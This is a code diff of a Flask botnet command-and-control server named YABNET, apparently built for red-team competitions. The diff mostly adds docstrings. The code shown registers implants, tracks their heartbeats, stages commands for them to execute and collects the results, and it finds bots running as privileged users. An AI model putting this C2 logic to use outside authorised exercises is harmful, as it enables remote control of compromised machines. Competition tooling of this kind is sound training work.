@@ -28,6 +28,7 @@ Also takes are of master console's request/response.
 # ============ Configuration can be change through config.py ===========
 
 app = Flask(__name__)
+# !! Change to config.DevConfig for debugging !! 
 app.config.from_object("config.ProdConfig")
 db.app = app
 db.init_app(app)
@@ -47,13 +48,12 @@ FIRSTCONTACTKEY = app.config.get("FIRSTCONTACTKEY")
 REGISTERKEY = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
 MASTERKEY = app.config.get("MASTERKEY")
 
-PRIVILEGED_USERS = ['root','Administrator','SYSTEM','captain','firstmate','stowaway']
+# Privileged users. This changes from competition to competition
+PRIVILEGED_USERS = app.config.get("PRIVILEGED_USERS")
 
 # Agent timer 
 TIMER = 40
 
-
-# TODO: Create a separate api.py and then import into the init.py file? 
 
 # ================================= API ==================================
 
@@ -100,6 +100,17 @@ def hello_world():
 
 @app.route('/auth', methods=['POST'])
 def authentication():
+    """
+    Description: Handles master authentication 
+
+    Params:
+        - username : Master's username. Configured in config.py 
+        - password : Master's password. Configured in config.py 
+
+    Return:
+        - (json) result : Result showing either success or failure
+        - (json) masterkey : Masterkey given to successfully authenticated master
+    """
 
     # Error checking
     error = posterrorcheck(request, 'username', 'password')
@@ -126,43 +137,19 @@ def authentication():
     except Exception as e:
         return jsonify({'result': 'Wrong username and/or password'})
 
-@app.route('/heartbeat', methods=['POST'])
-def heartbeat():
-    """
-    Description: Endpoint which takes report of bots' heartbeat. Will check
-    if the bot is still alive, and update the timestamp of the bot as well. 
-    """
-
-    # Error checking 
-    error = posterrorcheck(request, 'ip', 'pid')
-    if error is not True:
-        return error 
-
-    # POST parameter parsing 
-    data = request.form
-
-    ip = data['ip']
-    pid = data['pid']
-
-    # API Endpoint logic 
-    # See if the bot exists, and if it does, update and refresh the timestamp    
-    try:
-        query_bot = Bot.query.filter_by(ip=ip).filter_by(pid=pid).first()
-        query_bot.set_timestamp(datetime.now())
-
-    except Exception as e:
-        return jsonify({'result': 'fail', 'error': '[-] Heartbeat not available for you'})
-
-    return jsonify({'result': 'success'})
 
 @app.route('/firstcontact', methods=['POST'])
 def firstcontact(): 
     """
-    Description: Endpoint which retrieves first contact from the bot. This endpoint acts as a sanity check that the visitor is indeed a YABNET bot. After the sanity check, the server will return a registerkey to the bot.
+    Description: Endpoint which retrieves first contact from the bot. 
+    This endpoint acts as a sanity check that the visitor is indeed a YABNET bot. 
+    After the sanity check, the server will return a registerkey to the bot.
     
-    [POST] 
-        - (str) firstcontactkey : firstcontact key to identify if the 
-        contact is coming from the implant or not 
+    Params: 
+        - firstcontactkey : Key to identify if the contact is coming from the implant or not 
+    Returns:
+        - (json) result : 'success' or 'fail' depending on correct firstcontactkey 
+        - (json) registerkey : Long string to validate that the bot successfully registered 
     """
 
     # Error checking 
@@ -185,12 +172,16 @@ def register():
     """
     Description: Register a new bot to the server. This endpoint officially adds a bot to the server's database. 
 
-    [POST] 
-        - registerkey = Register key that is needed for the registration process. 
+    Params: 
+        - registerkey : Register key that is needed for the registration process. 
         The key could be obtained through the firstcontact. 
+        - ip : IP address of the bot 
+        - os : OS type (Nix/Windows) of the bot 
+        - user: user of the current proceses of the bot 
+        - pid : pid of the bot 
 
-        - ip = IP address of the bot 
-        - os = OS type (Nix/Windows) of the bot 
+    Return:
+        - (json) result : 'success' or 'fail' depending on various conditions 
     """
 
     # Error checking 
@@ -230,8 +221,60 @@ def register():
         ## 'botid':bot.id
         return jsonify({'result': 'success', 'botid': bot.id})
 
+@app.route('/heartbeat', methods=['POST'])
+def heartbeat():
+    """
+    Description: Endpoint which takes report of bots' heartbeat. Will check
+    if the bot is still alive, and update the timestamp of the bot as well. 
+
+    Heartbeat endpoint is used for already registered bots. Once bots are registered,
+    they simply send heartbeats to let the server know they are still alive. 
+
+    Params:
+        - ip = ip address of the bot
+        - pid = pid of the bot. Used to check bot's uniqueness - incase multiple bot in same machine 
+    
+    Returns:
+        - (json) result = Success or failure of heartbeat. Fails when can't find bot in database
+    """
+
+    # Error checking 
+    error = posterrorcheck(request, 'ip', 'pid')
+    if error is not True:
+        return error 
+
+    # POST parameter parsing 
+    data = request.form
+
+    ip = data['ip']
+    pid = data['pid']
+
+    # API Endpoint logic 
+    # See if the bot exists, and if it does, update the timestamp    
+    try:
+        query_bot = Bot.query.filter_by(ip=ip).filter_by(pid=pid).first()
+        query_bot.set_timestamp(datetime.now())
+
+    except Exception as e:
+        return jsonify({'result': 'fail', 'error': '[-] Heartbeat not available for you'})
+
+    return jsonify({'result': 'success'})
+
+
+
 @app.route('/bot/find', methods=['POST'])
 def findhost():
+    """
+    Description: Of all current bots across all teams, find bots running with privileged user account 
+
+    Params:
+        - masterkey : Masterkey to validate request is coming from master 
+        - hostname : Hostname of the bots across all the teams 
+
+    Returns:
+        - (json) Bot : Dictionary form of Bot class. Contains the following 
+            - id, ip, os, user, pid, timestamp 
+    """
     # Error checking  
     error = posterrorcheck(request, 'masterkey', 'hostname')
     if error is not True:
@@ -256,8 +299,12 @@ def findhost():
 
     return Response(json.dumps(jsonbot_list), mimetype='application/json')
 
+# TODO: Currently work in progress 
 @app.route('/bot/hostname/push', methods=['POST'])
 def hostnamepush():
+    """
+    Description: <TODO: WORK IN PROGRESS> 
+    """
     # Error checking  
     error = posterrorcheck(request, 'masterkey', 'cmd', 'hostname')
     if error is not True:
@@ -277,11 +324,18 @@ def hostnamepush():
 @app.route('/bot/<target>/push', methods=['POST'])
 def botpush(target):
     """
-    Description: Pushes the command into the bot and cmd Model. The command pushed into the bot and cmd model will later be used in the /task endpoint. 
+    Description: Pushes the command into the bot and cmd Model. 
+    The command pushed into the bot and cmd model will later be used in the /task endpoint. 
 
-    [POST]
-        - masterkey = Master's secret key 
-        - cmd = Command to push to the bot 
+    target = bot ID to push commands into 
+
+    Params:
+        - masterkey : Master's secret key 
+        - cmd : Command to push to the bot 
+
+    returns:
+        - (json) result : 'Command staged' upon successfully staging the command 
+        - (json) error : error  
     """
 
     # Error checking  
@@ -304,26 +358,22 @@ def botpush(target):
 
     # API Endpoint logic 
 
-    # Master pushed command with specifying bot ip address 
+    # Find bot based on bot ID (ip is deprecated) and push command 
     try:
-        # Query and get the bot which has the bot_ip, and then append the command to it 
-        
         if bot_ip != '':
-            print(bot_ip)
             query_bot = Bot.query.filter_by(ip=bot_ip).first()
         else:
             query_bot = Bot.query.filter_by(id=bot_id).first()
 
+        # Create command model based on the information 
         cmd = Command(cmd, query_bot.id, query_bot.ip, query_bot.os)
-        print(cmd)
 
-        # Actually push the command to the bot. If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
+        # Actually push the command to the bot. 
+        # If there is a previous command queued (making len(query_bot.cmds) >=1 ), ignore.
         try:
             query_bot.cmds.append(cmd)
             db.session.add(cmd)
             db.session.commit()
-
-            #print("[DEBUG] Command staged")
 
             return jsonify({'result': 'Command staged'})
 
@@ -337,10 +387,15 @@ def botpush(target):
 @app.route('/bot/<bot_id>/task', methods=['POST'])
 def bottask(bot_id):
     """
-    Description: Returns the command that is staged for the corresponding bot. The bot will visit this endpoint, retrieve the command, and execute it.
+    Description: Returns the command staged for the corresponding bot. 
+    The bot will visit this endpoint, retrieve the command, and execute it.
 
-    [POST]
-        - registerkey = "Authentication" key for the bot  
+    Params:
+        - registerkey : Bot's registration key
+
+    Returns:
+        - (json) result : 'success' or 'fail' depending on conditions 
+        - (json) command : Command string issued by the master 
     """
 
     # Error checking 
@@ -384,12 +439,15 @@ def botresult(bot_id):
     Description: API endpoint which the bot comes and reports the result of the staged command. 
     
     If a bot visits, the endpoint will update the result of the Command Model of the corresponding bot. 
+    If a master visits, the endpoint will return the Command model. 
 
-    If a master visits, the endpoint will show the result. 
+    Params:
+        - registerkey : If a bot visits, the request must have bot's register key 
+        - masterkey : If a master visits, the request must have master's masterkey
 
-    [POST]
-        - key = Either bot_unique_key or masterkey. Endpoint's behavior changes correspondingly 
-        - result = 
+    Returns:
+        - (json) '' : Empty string return if bot visits
+        - (json) Command : Command object if master visits. Master can then parse the object.
     """
 
     # Error checking 
@@ -413,14 +471,12 @@ def botresult(bot_id):
                 command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
                 command.set_result(result)
 
-                #query_bot.cmds.clear()
-
                 db.session.commit()
                 
                 # This needs to be changed 
                 return '' 
 
-        # Master visiting endpoint. Return result of the command. 
+        # Master visiting endpoint. Return the command object. 
         elif 'masterkey' in data:
             query_bot = Bot.query.filter_by(id=bot_id).first()
             
@@ -429,15 +485,15 @@ def botresult(bot_id):
                 command = Command.query.filter_by(bot_id=bot_id).order_by(Command.id.desc()).first()
                 #print("[DEBUG] command info = ", command.get_info())
                 
+                # Create dictionary form of command object 
                 json_command = command.jsoncommand()
 
-                #query_bot.cmds.remove(command)
                 db.session.commit()
 
+                # Return command object if command.result exists (that is, bot reported back command's result)
                 if command.result is None:
                     return jsonify({'error': 'Bot have not called back'})
                 else:
-                    #print(json_command)
                     return Response(json.dumps(json_command), mimetype='application/json') 
 
             except Exception as e:
@@ -451,13 +507,20 @@ def botresult(bot_id):
     
 @app.route('/refresh', methods=['GET'])
 def refresh():
+    """
+    Description: Refresh the bot table of the database. If a bot have not sent heartbeat in 
+    2 minutes, chances are it's dead. Or it's callback is getting blocked. 
+    Either way, Remove the bot. 
+
+    Master console regularly will hit this endpoint. 
+    """
     try:
         botlist = Bot.query.all()
     except Exception as e:
         return ''
 
     try:
-        # If bot missed two~three heartbeat interval (default is 40seconds*3 = 120 seconds), then remove the bot. We lost it. 
+        # If bot missed two~three heartbeat interval (default is 40seconds*3 = 120 seconds), then remove the bot. 
         for bot in botlist:
             if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
                 db.session.delete(bot)
@@ -465,15 +528,18 @@ def refresh():
     except Exception as e:
         pass 
 
-    #print (botlist)
     return '' 
 
-# TODO: Change the result to json, as this is an API endpoint 
+
 @app.route('/bot/list', methods=['POST'])
 def botlist():
     """
     Description: View and return all the bots in the server database
-    TODO: Implement returning bot objects in json format 
+    
+    Params:
+        - masterkey : Masterkey from master 
+    Returns:
+        - (json) Botlist : List of bot objects in json format 
     """
 
     # Error checking 
@@ -502,7 +568,14 @@ def botlist():
 
 @app.route('/bot/commands', methods=['POST'])
 def commandlist():
-
+    """
+    Description: View and return all the commands in the server database
+    
+    Params:
+        - masterkey : Masterkey from master 
+    Returns:
+        - (json) commandlist : List of command objects in json format 
+    """
     # Error checking 
     error = posterrorcheck(request, 'masterkey')
     if error is not True:
@@ -557,10 +630,12 @@ def broadcast():
 
     return jsonify({ 'result': '[+] Broadcast successful' })
 
-# Endpoint created for debugging purposes. Ignore it for now. 
-# Shows the files in /opt/yabnet/uploads directory, which is the base upload directory. 
+
 @app.route('/files')
 def list_files():
+    """
+    Description: Returns a list of files in server's current upload directory
+    """
     files = [] 
     for item in os.listdir(UPLOAD_DIRECTORY):
         path = os.path.join(UPLOAD_DIRECTORY, item)
@@ -572,8 +647,15 @@ def list_files():
 @app.route('/upload', methods=['POST'])
 def upload_file():
     """
-    Description: File upload endpoint for the bot. 
-    TODO: Change this into POST request method and only allow upload from registered bots  
+    Description: Endpoint where the master can upload files to the server's upload directory 
+
+    Params:
+        - masterkey : masterkey 
+        - (file) file : File to be uploaded 
+
+    Returns:
+        - success : success
+        - error : error 
     """
     # Error checking 
     error = posterrorcheck(request, 'masterkey')
@@ -641,7 +723,10 @@ def updatepwnboard():
     Pwnboard accepts post param of "ips" (list) and "type" (str). 
 
     Params:
-        - (str) pwnboardURL = pwnboard Endpoint URL 
+        - pwnboardURL : pwnboard Endpoint URL 
+
+    Returns:
+        - success : Shows if updating pwnboard was successful or not 
     """
     error = posterrorcheck(request, 'masterkey', 'pwnboardURL')
     if error is not True:
@@ -683,9 +768,12 @@ def updatepwnboard():
 
 
 def test_db():
+    """
+    Just a function used for debugging purposes. Ignore me!!! 
+    """
     bot_ip = ['10.1.1.2', '10.1.1.3', '10.1.1.4', '10.1.1.5', '10.1.1.6', '10.1.1.7', '10.1.1.8', '10.2.1.2', '10.2.1.3', '10.2.1.4', '10.2.1.5', '10.2.1.6', '10.2.1.7', '10.2.1.8', '10.3.1.2', '10.3.1.3', '10.3.1.4', '10.3.1.5', '10.3.1.6', '10.3.1.7', '10.3.1.8', '10.4.1.2', '10.4.1.3', '10.4.1.4', '10.4.1.5', '10.4.1.6', '10.4.1.7', '10.4.1.8', '10.5.1.2', '10.5.1.3', '10.5.1.4', '10.5.1.5', '10.5.1.6', '10.5.1.7', '10.5.1.8', '10.6.1.2', '10.6.1.3', '10.6.1.4', '10.6.1.5', '10.6.1.6', '10.6.1.7', '10.6.1.8', '10.7.1.2', '10.7.1.3', '10.7.1.4', '10.7.1.5', '10.7.1.6', '10.7.1.7', '10.7.1.8', '10.8.1.2', '10.8.1.3', '10.8.1.4', '10.8.1.5', '10.8.1.6', '10.8.1.7', '10.8.1.8', '10.9.1.2', '10.9.1.3', '10.9.1.4', '10.9.1.5', '10.9.1.6', '10.9.1.7', '10.9.1.8', '10.10.1.2', '10.10.1.3', '10.10.1.4', '10.10.1.5', '10.10.1.6', '10.10.1.7', '10.10.1.8']
     hostname = ['annebonny', 'williamkidd', 'calicojack', 'maryread', 'edwardteach', 'captaincrapo', 'canoot', 'nemo', 'gunner', 'laurellabonaire', 'lockelamora', 'hook']
-    bot_user = ['root','blackteam','Administrator','joe','NT Authority\SYSTEM']
+    bot_user = ['root','whiteteam','Administrator','duder','NT Authority\SYSTEM']
     bot_pid = '5000'
 
     counter = 0
